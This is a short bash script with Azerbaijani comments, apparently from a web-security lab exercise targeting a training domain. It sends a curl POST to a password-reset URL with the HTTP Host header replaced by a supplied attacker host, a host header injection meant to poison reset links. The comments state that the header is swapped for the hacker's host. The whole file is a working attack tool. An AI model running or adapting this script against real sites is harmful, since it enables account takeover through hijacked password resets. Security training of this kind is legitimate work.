#!/bin/bash

# Skriptə ötürülən arqumentləri dəyişənlərə mənimsədirik:
# $1 = NEW HOST (Məsələn: new_host)
# $2 = TARGET URL (Məsələn: http://web0x00.hbtn/reset_password)
# $3 = FORM DATA (Məsələn: email=test@test.hbtn)

NEW_HOST=$1
TARGET_URL=$2
FORM_DATA=$3

# curl əmri ilə POST sorğusu göndəririk:
# -H "Host: $NEW_HOST" -> HTTP Host başlığını hakerin hostu ilə əvəzləyir
# -d "$FORM_DATA" -> Form məlumatlarını (məsələn emaili) POST body olaraq göndərir
# -s -> curl-ün lazımsız yüklənmə loqlarını gizlədir (silent mode)

curl -s -H "Host: $NEW_HOST" -d "$FORM_DATA" "$TARGET_URL"
